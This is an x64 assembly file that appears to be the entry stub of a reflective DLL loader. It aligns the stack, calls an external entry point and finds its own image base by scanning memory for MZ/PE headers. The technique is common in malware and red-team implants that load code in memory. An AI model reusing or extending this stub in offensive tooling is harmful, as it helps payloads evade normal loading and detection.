extern Entry

global Start
global Spoof
global GetRIP
global KaynCaller
global End
global Fixup

section .text$A
	Start:
        push    rsi
        mov		rsi, rsp
        and		rsp, 0FFFFFFFFFFFFFFF0h

        sub		rsp, 020h
        call    Entry
        
        mov		rsp, rsi
        pop		rsi
    ret

section .text$F
    KaynCaller:
           call caller
    caller:
           pop rcx
        
    find_dos:
        push r11
        sub rsp, 8
        loop:
            xor r11, r11
            mov r11w, 0x5A4D
            inc rcx
            cmp r11w, [ rcx ]
            jne loop
            xor rax, rax
            mov ax, [ rcx + 0x3C ]
            add rax, rcx
            xor r11, r11
            add r11w, 0x4550
            cmp r11w, [ rax ]
            jne loop
            mov rax, rcx
        pop r11
        add rsp, 8
    ret

    GetRIP:
        call    retptr

    retptr:
        pop	rax
        sub	rax, 5
    ret

section .text$END
    End:
        jmp rbx
        ret
